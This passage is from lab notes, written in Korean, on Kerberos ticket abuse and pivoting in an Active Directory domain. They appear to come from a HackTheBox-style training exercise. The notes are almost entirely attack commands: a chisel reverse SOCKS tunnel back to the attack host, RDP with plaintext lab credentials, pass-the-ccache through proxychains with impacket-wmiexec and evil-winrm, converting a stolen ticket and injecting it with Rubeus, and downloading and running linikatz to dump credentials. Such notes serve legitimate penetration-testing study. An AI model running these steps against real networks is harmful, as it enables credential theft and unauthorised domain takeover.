$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
$ gzip -d chisel_1.7.7_linux_amd64.gz
$ mv chisel_* chisel && chmod +x ./chisel
$ sudo ./chisel server --reverse
```

#### Connect to MS01 with xfreerdp
```$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution```

#### Execute chisel from MS01
- 클라이언트 IP는 공격 호스트 IP<br/>
```C:\> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks```

#### KRB5CCNAME 환경 변수 설정
```$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133```

#### Using Impacket with proxychains and Kerberos Authentication
```
$ proxychains impacket-wmiexec dc01 -k
C:\>whoami
```
> 도메인에 연결된 Linux 머신에서 Impacket 도구를 사용하는 경우 일부 Linux Active Directory 구현은 KRB5CCNAME 변수에 FILE: 접두사를 사용.
> 이 경우 ccache 파일에 대한 경로만 포함하도록 변수를 수정해야 함

#### Using Evil-WinRM with Kerberos
- Kerberos에서 [evil-winrm](https://github.com/Hackplayers/evil-winrm)을 사용하려면 네트워크 인증에 사용되는 Kerberos 패키지(`krb5-user`)를 설치해야 함<br/>
```$ sudo apt-get install krb5-user -y```<br/>
- `krb5-user`가 이미 설치되어 있는 경우 구성 파일 `/etc/krb5.conf`를 다음 값을 포함하도록 변경<br/>
```
$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```
```$ proxychains evil-winrm -i dc01 -r inlanefreight.htb```

### 기타 종류

#### Impacket Ticket Converter
```$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi```

#### Importing Converted Ticket into Windows Session with Rubeus
```
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
C:\htb> klist
C:\htb> dir \\dc01\julio
```

#### Linikatz
```
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh
```


